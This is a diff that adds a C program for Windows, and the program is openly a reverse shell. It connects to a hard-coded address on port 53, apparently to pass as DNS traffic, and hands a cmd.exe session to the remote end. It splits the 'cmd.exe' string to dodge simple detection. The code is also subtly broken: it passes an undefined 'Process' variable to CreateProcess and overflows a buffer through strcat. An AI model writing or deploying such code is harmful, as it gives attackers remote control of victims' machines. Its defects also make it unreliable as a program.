@@ -1,0 +1,51 @@
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFLEN 1024
+
+void Run(char* Server, int Port) {
+        SOCKET mySocket;
+        struct sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2,2), &version);
+        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        addr.sin_family = AF_INET;
+
+        addr.sin_addr.s_addr = inet_addr(Server);
+        addr.sin_port = htons(Port);
+
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            closesocket(mySocket);
+            WSACleanup();
+        } else {
+	    char P1[] = "cm";
+	    char P2[] = "d.exe";
+	    char* P = strcat(P1, P2); 
+            STARTUPINFO sinfo;
+            PROCESS_INFORMATION pinfo;
+            memset(&sinfo, 0, sizeof(sinfo));
+            sinfo.cb = sizeof(sinfo);
+            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
+            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+
+            WaitForSingleObject(pinfo.hProcess, INFINITE);
+            CloseHandle(pinfo.hProcess);
+            CloseHandle(pinfo.hThread);
+        }
+}
+
+int main(int argc, char **argv) {
+    if (argc == 3) {
+        int port  = atoi(argv[2]);
+        Run(argv[1], port);
+    }
+    else {
+        char host[] = "10.17.11.201";
+        int port = 53;
+        Run(host, port);
+    }
+    return 0;
+} 
